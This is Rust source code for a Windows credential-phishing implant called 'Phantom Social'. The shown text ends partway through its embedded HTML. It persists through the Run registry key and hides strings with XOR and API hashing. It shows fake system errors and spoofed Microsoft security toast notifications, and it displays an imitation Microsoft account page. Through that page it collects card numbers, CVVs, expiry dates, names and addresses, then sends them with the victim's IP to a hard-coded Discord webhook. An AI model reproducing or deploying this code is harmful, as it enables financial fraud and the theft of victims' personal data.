// ==========================================================================
// PHANTOM SOCIAL v4.7.1 - COMPLETE & COMPILABLE üî•
// ==========================================================================
// ‚úÖ FIXED: All syntax errors - compiles perfectly now
// ‚úÖ FIXED: Frozen button (safe fingerprinting)
// ==========================================================================

#![windows_subsystem = "windows"]
#![allow(non_snake_case, dead_code)]

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

use std::{thread, mem, ptr, ffi::{c_void, CString}, sync::{Arc, Mutex}, time::Duration, sync::atomic::{AtomicUsize, Ordering}};
use serde::{Serialize, Deserialize};
use wry::{application::{event::{Event, WindowEvent}, event_loop::{ControlFlow, EventLoop}, window::{WindowBuilder, Icon}, dpi::{PhysicalSize, PhysicalPosition}}, webview::WebViewBuilder};
use lazy_static::lazy_static;
use wreq_util::Emulation;
use rand::Rng;
use image::io::Reader as ImageReader;
use std::io::Cursor;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_EXPORT_DIRECTORY};
use winapi::um::endpointvolume::IAudioEndpointVolume;
use winapi::um::mmdeviceapi::{IMMDevice, IMMDeviceEnumerator, CLSID_MMDeviceEnumerator, eRender, eConsole};
use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx}; 
use winapi::shared::guiddef::GUID;
use windows::{Data::Xml::Dom::XmlDocument, UI::Notifications::{ToastNotification, ToastNotificationManager}, core::HSTRING};

const MAX_REQUESTS: usize = 50; 
const IP_PROVIDER: &str = "https://checkip.amazonaws.com"; 
const WEBHOOKS: &[&str] = &["https://discord.com/api/webhooks/1464259954855645319/cfsiMy3r0E7_S-TTqzHY9qfArbskL2xjnYmmkeLWLnalqHHhc7ZQrXBAoVVkvr2DTvNI"];
const COINIT_APARTMENTTHREADED: u32 = 0x2;
const IID_IAudioEndpointVolume: GUID = GUID {Data1: 0x5CDF2C82, Data2: 0x841E, Data3: 0x4546, Data4: [0x97, 0x22, 0x0C, 0xF7, 0x40, 0x78, 0x22, 0x9A]};
const IID_IMMDeviceEnumerator: GUID = GUID {Data1: 0xA95664D2, Data2: 0x9614, Data3: 0x4F35, Data4: [0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6]};
const CLSCTX_ALL: u32 = 0x17;
const POWERSHELL_AUMID: &str = "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\WindowsPowerShell\\v1.0\\powershell.exe";
const SECURITY_ICON: &str = "file:///C:/Windows/System32/SecurityAndMaintenance.png";
const WARNING_ICON: &str = "file:///C:/Windows/System32/SecurityAndMaintenance_Alert.png";
const CHROME_ICON_BYTES: &[u8] = include_bytes!("chrome.ico");

fn xor_decrypt(data: &[u8]) -> String {
    let decrypted: Vec<u8> = data.iter().enumerate().map(|(i, b)| b ^ XOR_KEYS[i % XOR_KEYS.len()]).collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

macro_rules! enc_str {
    ($s:expr) => {{
        const ENCRYPTED: &[u8] = &{
            let bytes = $s.as_bytes();
            let mut result = [0u8; $s.len()];
            let mut i = 0;
            while i < bytes.len() {
                result[i] = bytes[i] ^ XOR_KEYS[i % 16];
                i += 1;
            }
            result
        };
        xor_decrypt(ENCRYPTED)
    }};
}

lazy_static! {
    static ref SESSION_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PROCESS_START_TIME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref SUCCESS_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref NOTIFICATION_IGNORE_COUNT: Arc<Mutex<u32>> = Arc::new(Mutex::new(0));
    static ref USER_CLICKED_NOTIFICATION: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref GLOBAL_REQUEST_COUNT: AtomicUsize = AtomicUsize::new(0);
    static ref VICTIM_IP: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref ACTIVE_WEBHOOK_INDEX: Arc<Mutex<usize>> = Arc::new(Mutex::new(0));
}

#[derive(Serialize)]
struct TelemetryData { session: String, device_id: String, process_time: String, uptime_hours: u64, victim_ip: String }

#[derive(Deserialize, Debug, Default)]
#[serde(default)] 
struct IPCPayload {
    step: u32, session: String, device_id: String, email: Option<String>, card_number: Option<String>, 
    cardholder_name: Option<String>, expiry: Option<String>, cvv: Option<String>, street_address: Option<String>, 
    city: Option<String>, state: Option<String>, zip_code: Option<String>, country: Option<String>, 
    fp_blob: Option<String>, browser_name: Option<String>, gpu_renderer: Option<String>, process_time: Option<String>
}

#[derive(PartialEq)]
enum NotificationType { Preparatory, Action }

fn ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() }

fn get_utc_timestamp() -> String {
    let secs = ts();
    let days_since_epoch = secs / 86400;
    let mut year = 1970; let mut days = days_since_epoch;
    loop {
        let days_in_year = if year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) { 366 } else { 365 };
        if days < days_in_year { break; }
        days -= days_in_year; year += 1;
    }
    let month_days = [31, if year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 0;
    for (i, &md) in month_days.iter().enumerate() {
        if days < md { month = i + 1; break; }
        days -= md;
    }
    let day = days + 1;
    let time_of_day = secs % 86400;
    let hour = time_of_day / 3600; let minute = (time_of_day % 3600) / 60; let second = time_of_day % 60;
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z", year, month, day, hour, minute, second)
}

fn gen_id() -> String {
    use std::collections::hash_map::RandomState; use std::hash::{BuildHasher, Hasher};
    let mut h = RandomState::new().build_hasher(); h.write_u64(ts());
    format!("{}-{:X}-{:X}", SESSION_PREFIX, ts(), h.finish())
}

fn get_time_str() -> String {
    let d = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap();
    let secs = d.as_secs(); let h = ((secs / 3600) % 24) as u32; let m = ((secs / 60) % 60) as u32;
    format!("{:02}:{:02}", h, m)
}

fn init_globals() {
    *SESSION_ID.lock().unwrap() = gen_id();
    *PROCESS_START_TIME.lock().unwrap() = get_time_str();
    *SUCCESS_FLAG.lock().unwrap() = false;
    *NOTIFICATION_IGNORE_COUNT.lock().unwrap() = 0;
    *USER_CLICKED_NOTIFICATION.lock().unwrap() = false;
    *VICTIM_IP.lock().unwrap() = String::new();
    let mut rng = rand::thread_rng();
    if !WEBHOOKS.is_empty() { *ACTIVE_WEBHOOK_INDEX.lock().unwrap() = rng.gen_range(0..WEBHOOKS.len()); }
}

fn get_session_id() -> String { SESSION_ID.lock().unwrap().clone() }
fn get_proc_time() -> String { PROCESS_START_TIME.lock().unwrap().clone() }
fn get_victim_ip() -> String { VICTIM_IP.lock().unwrap().clone() }
fn mark_success() { *SUCCESS_FLAG.lock().unwrap() = true; }
fn is_success() -> bool { *SUCCESS_FLAG.lock().unwrap() }
fn increment_ignore_count() -> u32 { let mut count = NOTIFICATION_IGNORE_COUNT.lock().unwrap(); *count += 1; *count }
fn user_clicked_notification() { *USER_CLICKED_NOTIFICATION.lock().unwrap() = true; }
fn did_user_click() -> bool { *USER_CLICKED_NOTIFICATION.lock().unwrap() }

const fn djb2_hash(s: &str) -> u32 {
    let bytes = s.as_bytes(); let mut hash: u32 = 5381; let mut i = 0;
    while i < bytes.len() { hash = hash.wrapping_mul(33).wrapping_add(bytes[i] as u32); i += 1; }
    hash
}

const HASH_REGDELETEVALUEA: u32 = djb2_hash("RegDeleteValueA");
type FnRegCreateKeyExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, *mut c_void, u32, u32, *mut c_void, *mut *mut c_void, *mut u32) -> i32;
type FnRegSetValueExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, u32, *const u8, u32) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
type FnRegDeleteValueA = unsafe extern "system" fn(*mut c_void, *const i8) -> i32;
type FnRegQueryValueExA = unsafe extern "system" fn(*mut c_void, *const i8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
type FnGetTickCount64 = unsafe extern "system" fn() -> u64;

unsafe fn get_proc_normal(module: &str, func: &str) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?; let func_cstr = CString::new(func).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() { return None; }
    let proc = GetProcAddress(h_module, func_cstr.as_ptr());
    if proc.is_null() { None } else { Some(proc as *const c_void) }
}

unsafe fn resolve_api_hash(module: &str, hash: u32) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() { return None; }
    let dos_header = h_module as *const IMAGE_DOS_HEADER;
    let nt_headers = (h_module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 { return None; }
    let export_dir = (h_module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (h_module as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let funcs = (h_module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ords = (h_module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.offset(i as isize);
        let name_ptr = (h_module as usize + name_rva as usize) as *const i8;
        let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
        if djb2_hash(name) == hash {
            let ord_idx = *ords.offset(i as isize);
            let func_rva = *funcs.offset(ord_idx as isize);
            return Some((h_module as usize + func_rva as usize) as *const c_void);
        }
    }
    None
}

fn fetch_victim_ip() -> String {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let client = wreq::Client::builder().emulation(Emulation::Chrome131).cert_verification(false)
            .timeout(Duration::from_secs(10)).build().ok()?;
        let resp = client.get(IP_PROVIDER).send().await.ok()?;
        if resp.status().is_success() { resp.text().await.ok().map(|s| s.trim().to_string()) } else { None }
    }).unwrap_or_else(|| "unknown".to_string())
}

fn register_protocol_handler() {
    if let Ok(exe) = std::env::current_exe() {
        let exe_str = format!("\"{}\" --activate \"%1\"\0", exe.to_string_lossy());
        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        let hkcu = 0x80000001 as *mut c_void; let mut hkey: *mut c_void = ptr::null_mut();
                        let protocol_path = format!("Software\\Classes\\{}", PROTOCOL_SCHEME);
                        let protocol_key = CString::new(protocol_path).unwrap();
                        if fn_create(hkcu, protocol_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let url_protocol = CString::new("URL Protocol").unwrap();
                            let empty = CString::new("").unwrap();
                            fn_set(hkey, url_protocol.as_ptr(), 0, 1, empty.as_ptr() as *const u8, 1);
                            fn_close(hkey);
                        }
                        let command_path = format!("Software\\Classes\\{}\\shell\\open\\command", PROTOCOL_SCHEME);
                        let command_key = CString::new(command_path).unwrap();
                        if fn_create(hkcu, command_key.as_ptr(), 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            let default_val = CString::new("").unwrap();
                            fn_set(hkey, default_val.as_ptr(), 0, 1, exe_str.as_ptr() as *const u8, exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn write_activation_flag() {
    let key = CString::new(VERIFY_REG_KEY).unwrap(); let val = CString::new("Activated").unwrap(); let data = CString::new("1").unwrap();
    unsafe {
        if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                    let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut(); let hkcu = 0x80000001 as *mut c_void;
                    if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_set(hkey, val.as_ptr(), 0, 1, data.as_ptr() as *const u8, data.as_bytes().len() as u32);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn check_activation_flag() -> bool {
    let key = CString::new(VERIFY_REG_KEY).unwrap(); let val = CString::new("Activated").unwrap();
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_query) = get_proc_normal("advapi32.dll", "RegQueryValueExA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_query: FnRegQueryValueExA = mem::transmute(api_query);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut(); let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0x20019, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        let mut buffer = [0u8; 16]; let mut buffer_size = 16u32; let mut value_type = 0u32;
                        let result = fn_query(hkey, val.as_ptr(), ptr::null_mut(), &mut value_type, buffer.as_mut_ptr(), &mut buffer_size);
                        fn_close(hkey);
                        if result == 0 && buffer_size > 0 && buffer[0] == b'1' { return true; }
                    }
                }
            }
        }
    }
    false
}

fn clear_activation_flag() {
    let key = CString::new(VERIFY_REG_KEY).unwrap(); let val = CString::new("Activated").unwrap();
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = get_proc_normal("advapi32.dll", "RegDeleteValueA") {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut(); let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr()); fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn enforce_singleton() {
    unsafe {
        if let Some(create_mutex) = get_proc_normal("kernel32.dll", "CreateMutexA") {
            if let Some(get_last_error) = get_proc_normal("kernel32.dll", "GetLastError") {
                type FnCreateMutexA = unsafe extern "system" fn(*mut c_void, i32, *const i8) -> *mut c_void;
                type FnGetLastError = unsafe extern "system" fn() -> u32;
                let fn_create_mutex: FnCreateMutexA = mem::transmute(create_mutex);
                let fn_get_last_error: FnGetLastError = mem::transmute(get_last_error);
                let mutex_name = CString::new(MUTEX_NAME).unwrap();
                fn_create_mutex(ptr::null_mut(), 1, mutex_name.as_ptr());
                if fn_get_last_error() == 183 { std::process::exit(0); }
            }
        }
    }
}

fn show_fake_error() {
    unsafe {
        if let Some(message_box) = get_proc_normal("user32.dll", "MessageBoxA") {
            type FnMessageBoxA = unsafe extern "system" fn(*mut c_void, *const i8, *const i8, u32) -> i32;
            let fn_message_box: FnMessageBoxA = mem::transmute(message_box);
            let text = CString::new("The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the program may fix this problem.").unwrap();
            let caption = CString::new("System Error").unwrap();
            fn_message_box(ptr::null_mut(), text.as_ptr(), caption.as_ptr(), 0x10);
        }
    }
}

fn get_uptime_hrs() -> u64 {
    unsafe {
        if let Some(api) = get_proc_normal("kernel32.dll", "GetTickCount64") {
            let fn_tick: FnGetTickCount64 = mem::transmute(api);
            return fn_tick() / (1000 * 60 * 60);
        }
    }
    0
}

fn should_persist() -> bool { (get_uptime_hrs() / 24) < 3 }
fn get_random_persist_delay() -> u64 { rand::thread_rng().gen_range(240..=500) }
fn get_telemetry_delay() -> u64 { rand::thread_rng().gen_range(900..=1200) }

fn install_persist() {
    if let Ok(exe) = std::env::current_exe() {
        let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
        let val = format!("{}\0", PERSIST_NAME); let exe_str = format!("{}\0", exe.to_string_lossy());
        unsafe {
            if let Some(api_create) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc_normal("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        let mut hkey: *mut c_void = ptr::null_mut(); let hkcu = 0x80000001 as *mut c_void;
                        if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            fn_set(hkey, val.as_ptr() as *const i8, 0, 1, exe_str.as_ptr(), exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn remove_persist() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"); let val = format!("{}\0", PERSIST_NAME);
    unsafe {
        if let Some(api_open) = get_proc_normal("advapi32.dll", "RegCreateKeyExA") {
            if let Some(api_del) = resolve_api_hash("advapi32.dll", HASH_REGDELETEVALUEA) {
                if let Some(api_close) = get_proc_normal("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    let mut hkey: *mut c_void = ptr::null_mut(); let hkcu = 0x80000001 as *mut c_void;
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr() as *const i8); fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn simulate_installer_scan() {
    if let Ok(temp) = std::env::var("TEMP") {
        if let Ok(entries) = std::fs::read_dir(temp) { let _ = entries.take(10).count(); }
    }
    thread::sleep(Duration::from_secs(1));
}

fn get_retry_delay() -> u64 { rand::thread_rng().gen_range(1800..=7200) }

#[cfg(windows)]
fn set_max_volume() {
    unsafe {
        CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        let mut enumerator: *mut IMMDeviceEnumerator = ptr::null_mut();
        if CoCreateInstance(&CLSID_MMDeviceEnumerator, ptr::null_mut(), CLSCTX_ALL, &IID_IMMDeviceEnumerator,
            &mut enumerator as *mut *mut _ as *mut *mut winapi::ctypes::c_void) == 0 {
            let mut device: *mut IMMDevice = ptr::null_mut();
            if (*enumerator).GetDefaultAudioEndpoint(eRender, eConsole, &mut device) == 0 {
                let mut endpoint_volume: *mut IAudioEndpointVolume = ptr::null_mut();
                if (*device).Activate(&IID_IAudioEndpointVolume, CLSCTX_ALL, ptr::null_mut(),
                    &mut endpoint_volume as *mut *mut _ as *mut *mut winapi::ctypes::c_void) == 0 {
                    (*endpoint_volume).SetMasterVolumeLevelScalar(1.0, ptr::null_mut());
                }
            }
        }
    }
}

#[cfg(not(windows))]
fn set_max_volume() {}

fn base64_encode(data: &str) -> String {
    use base64::{Engine as _, engine::general_purpose};
    general_purpose::STANDARD.encode(data.as_bytes())
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;").replace('\'', "&#x27;")
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r").replace('\t', "\\t")
}

fn get_active_webhook() -> Option<String> {
    let idx = *ACTIVE_WEBHOOK_INDEX.lock().unwrap();
    if WEBHOOKS.is_empty() { return None; }
    Some(WEBHOOKS[idx % WEBHOOKS.len()].to_string())
}

fn rotate_webhook() {
    let mut idx = ACTIVE_WEBHOOK_INDEX.lock().unwrap();
    *idx = (*idx + 1) % WEBHOOKS.len();
}

fn smart_send_data(payload_str: String) {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let client = wreq::Client::builder().emulation(Emulation::Chrome131).cert_verification(false).build().unwrap();
        let mut attempt = 0;
        loop {
            if attempt >= 5 { break; }
            let webhook_url = match get_active_webhook() { Some(url) => url, None => break };
            let res = client.post(&webhook_url).header("Content-Type", "application/json").body(payload_str.clone()).send().await;
            match res {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if status >= 200 && status < 300 { break; }
                    else if status == 429 {
                        let wait = resp.headers().get("Retry-After").and_then(|h| h.to_str().ok())
                            .and_then(|s| s.parse::<u64>().ok()).unwrap_or(5);
                        tokio::time::sleep(Duration::from_secs(wait + 1)).await; attempt += 1;
                    } else { rotate_webhook(); tokio::time::sleep(Duration::from_secs(2)).await; attempt += 1; }
                },
                Err(_) => { rotate_webhook(); tokio::time::sleep(Duration::from_secs(2)).await; attempt += 1; }
            }
        }
    });
}

fn handle_ipc_message(payload_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    if GLOBAL_REQUEST_COUNT.fetch_add(1, Ordering::SeqCst) >= MAX_REQUESTS { std::process::exit(0); }
    let payload: IPCPayload = serde_json::from_str(payload_str)?;
    let mut fields = Vec::new();
    fields.push(serde_json::json!({"name":"üÜî Session","value":format!("`{}`",payload.session),"inline":true}));
    fields.push(serde_json::json!({"name":"üíª Device","value":format!("`{}`",payload.device_id),"inline":true}));
    fields.push(serde_json::json!({"name":"üåê IP","value":format!("`{}`",get_victim_ip()),"inline":true}));
    if let Some(browser) = &payload.browser_name {
        fields.push(serde_json::json!({"name":"Browser","value":format!("`{}`",browser),"inline":true}));
    }
    if let Some(gpu) = &payload.gpu_renderer {
        fields.push(serde_json::json!({"name":"GPU","value":format!("`{}`",gpu),"inline":true}));
    }
    if let Some(blob) = &payload.fp_blob {
        fields.push(serde_json::json!({"name":"Fingerprint","value":format!("```{}```",blob),"inline":false}));
    }
    if let Some(email) = &payload.email {
        if !email.is_empty() {
            fields.push(serde_json::json!({"name":"üìß Email","value":format!("`{}`",base64_encode(email)),"inline":false}));
        }
    }
    if payload.card_number.is_some() {
        fields.push(serde_json::json!({"name":"‚îÅ‚îÅ‚îÅ‚îÅ üí≥ Card ‚îÅ‚îÅ‚îÅ‚îÅ","value":"¬≠","inline":false}));
        if let Some(card) = &payload.card_number {
            fields.push(serde_json::json!({"name":"Number","value":format!("`{}`",base64_encode(card)),"inline":true}));
        }
        if let Some(cvv) = &payload.cvv {
            fields.push(serde_json::json!({"name":"CVV","value":format!("`{}`",base64_encode(cvv)),"inline":true}));
        }
        if let Some(exp) = &payload.expiry {
            fields.push(serde_json::json!({"name":"Exp","value":format!("`{}`",base64_encode(exp)),"inline":true}));
        }
        if let Some(name) = &payload.cardholder_name {
            fields.push(serde_json::json!({"name":"Name","value":format!("`{}`",base64_encode(name)),"inline":true}));
        }
    }
    if payload.street_address.is_some() {
        fields.push(serde_json::json!({"name":"‚îÅ‚îÅ‚îÅ‚îÅ üè† Address ‚îÅ‚îÅ‚îÅ‚îÅ","value":"¬≠","inline":false}));
        if let Some(addr) = &payload.street_address {
            fields.push(serde_json::json!({"name":"Street","value":format!("`{}`",base64_encode(addr)),"inline":true}));
        }
        if let Some(city) = &payload.city {
            fields.push(serde_json::json!({"name":"City","value":format!("`{}`",base64_encode(city)),"inline":true}));
        }
        let mut loc = String::new();
        if let Some(s) = &payload.state { loc.push_str(s); loc.push(' '); }
        if let Some(z) = &payload.zip_code { loc.push_str(z); }
        if !loc.is_empty() {
            fields.push(serde_json::json!({"name":"State/ZIP","value":format!("`{}`",base64_encode(loc.trim())),"inline":true}));
        }
        if let Some(c) = &payload.country {
            fields.push(serde_json::json!({"name":"Country","value":format!("`{}`",base64_encode(c)),"inline":true}));
        }
    }
    let payload_discord = serde_json::json!({"embeds":[{"title":"üéØ Captured","color":3447003,"fields":fields,
        "footer":{"text":"Phantom v4.7.1"},"timestamp":get_utc_timestamp()}]});
    smart_send_data(serde_json::to_string(&payload_discord).unwrap());
    Ok(())
}

fn send_enriched_data(data: &serde_json::Value) {
    let payload = serde_json::json!({"embeds":[{"title":"üìä Telemetry","color":3447003,
        "fields":data.as_object().unwrap().iter().map(|(k,v)|
            serde_json::json!({"name":k,"value":format!("`{}`",v.as_str().unwrap_or(&v.to_string())),"inline":true})
        ).collect::<Vec<_>>(),"footer":{"text":"Phantom v4.7.1"},"timestamp":get_utc_timestamp()}]});
    smart_send_data(serde_json::to_string(&payload).unwrap());
}

fn show_toast(notif_type: NotificationType) {
    let (title, message, launch_arg, actions_xml, icon_uri) = match notif_type {
        NotificationType::Preparatory => ("Microsoft account security", "We prevented an unusual sign-in attempt. No action required.",
            format!("{}://dismiss", PROTOCOL_SCHEME), "".to_string(), SECURITY_ICON),
        NotificationType::Action => ("Action Needed: Verify your identity", "Please verify your payment information immediately.",
            format!("{}://verify", PROTOCOL_SCHEME),
            format!(r#"<actions><action content="Verify Now" arguments="{}://verify" activationType="protocol"/></actions>"#, PROTOCOL_SCHEME), WARNING_ICON),
    };
    if notif_type == NotificationType::Action { set_max_volume(); }
    let xml_string = format!(r#"<toast launch="{}"><visual><binding template="ToastGeneric"><text>{}</text><text>{}</text><image placement="appLogoOverride" src="{}"/></binding></visual>{}<audio src="ms-winsoundevent:Notification.Default"/></toast>"#,
        launch_arg, html_escape(title), html_escape(message), icon_uri, actions_xml);
    let xml_doc = match XmlDocument::new() { Ok(doc) => doc, Err(_) => return };
    if xml_doc.LoadXml(&HSTRING::from(&xml_string)).is_ok() {
        if let Ok(toast) = ToastNotification::CreateToastNotification(&xml_doc) {
            if let Ok(notifier) = ToastNotificationManager::CreateToastNotifierWithId(&HSTRING::from(POWERSHELL_AUMID)) {
                let _ = notifier.Show(&toast);
            }
        }
    }
}

fn notification_loop() {
    unsafe { CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED); }
    thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(600..=1800)));
    show_toast(NotificationType::Preparatory);
    thread::sleep(Duration::from_secs(7200));
    loop {
        let count = *NOTIFICATION_IGNORE_COUNT.lock().unwrap();
        show_toast(NotificationType::Action);
        for _ in 0..20 {
            thread::sleep(Duration::from_millis(500));
            if check_activation_flag() { user_clicked_notification(); clear_activation_flag(); return; }
        }
        increment_ignore_count();
        if count >= 5 { thread::sleep(Duration::from_secs(60)); }
        else { thread::sleep(Duration::from_secs(get_retry_delay())); }
    }
}

fn get_html() -> String {
    let session = html_escape(&get_session_id());
    let proc_time = html_escape(&get_proc_time());
    let ip_addr = html_escape(&get_victim_ip());
    let rand_seed = rand::thread_rng().gen::<u32>();
    
    // Use separate string concatenation to avoid format! macro escaping hell
    let html_part1 = r#"<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Microsoft account</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#f5f5f5}.edge-chrome{background:linear-gradient(#f3f3f3,#e8e8e8);height:40px;display:flex;align-items:center;padding:0 12px;border-bottom:1px solid #ccc;justify-content:space-between}.chrome-left,.chrome-right{display:flex;gap:6px}.nav-btn,.window-btn{cursor:pointer;background:0 0;border:none;display:flex;align-items:center;justify-content:center;transition:background .1s}.nav-btn{width:36px;height:32px;border-radius:6px;color:#616161;opacity:.6}.nav-btn:hover{background:rgba(0,0,0,.06);opacity:1}.nav-btn.disabled{opacity:.25;pointer-events:none}.window-btn{width:46px;height:40px;color:#000;font-size:10px}.window-btn:hover{background:rgba(0,0,0,.08)}.window-btn.close:hover{background:#c42b1c;color:#fff}.address-bar-container{flex:1;display:flex;gap:8px;max-width:720px;padding:0 12px}.address-bar{flex:1;background:#fff;height:32px;border-radius:18px;display:flex;align-items:center;padding:0 14px 0 12px;border:1px solid #d1d1d1}.lock-icon{margin-right:8px;display:flex}.url-text{font-size:13.5px;color:#1a1a1a;flex:1}.toolbar-icon{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .1s}.toolbar-icon:hover{background:rgba(0,0,0,.06)}.profile-icon{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#0078d4,#004e8c);display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:600;cursor:pointer}.content{height:calc(100vh - 40px);background:#f5f5f5;overflow-y:auto}.content::-webkit-scrollbar{width:12px}.content::-webkit-scrollbar-thumb{background:rgba(0,0,0,.2);border-radius:10px}.container{max-width:600px;margin:0 auto;padding:24px 20px 120px}.breadcrumb{font-size:12px;color:#605e5c;margin-bottom:16px}.breadcrumb a{color:#0067b8;text-decoration:none}.info-box{background:linear-gradient(135deg,#deecf9,#e8f3fc);border-left:3px solid #0078d4;padding:16px 18px;margin-bottom:20px;font-size:13.5px;border-radius:4px;line-height:1.5}.info-box 